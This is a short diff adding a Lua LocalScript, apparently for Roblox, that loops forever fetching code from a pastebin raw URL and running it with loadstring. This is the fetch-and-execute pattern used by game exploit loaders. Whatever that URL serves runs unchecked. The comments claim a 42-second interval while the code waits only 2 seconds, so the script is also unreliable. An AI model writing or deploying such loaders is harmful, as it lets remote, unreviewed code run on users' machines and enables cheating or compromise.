@@ -1,0 +1,19 @@
+-- LocalScript to run a script from a URL every 42 seconds
+
+-- Function to fetch and execute the external script
+local function executeExternalScript()
+    local url = "https://pastebin.com/raw/Mj04gdca"
+    local success, result = pcall(function()
+        return loadstring(game:HttpGet(url))()
+    end)
+
+    if not success then
+        warn("Failed to execute the external script: " .. tostring(result))
+    end
+end
+
+-- Main loop to run the script every 42 seconds
+while true do
+    executeExternalScript()
+    wait(2)  -- Wait for 42 seconds before running the script again
+end
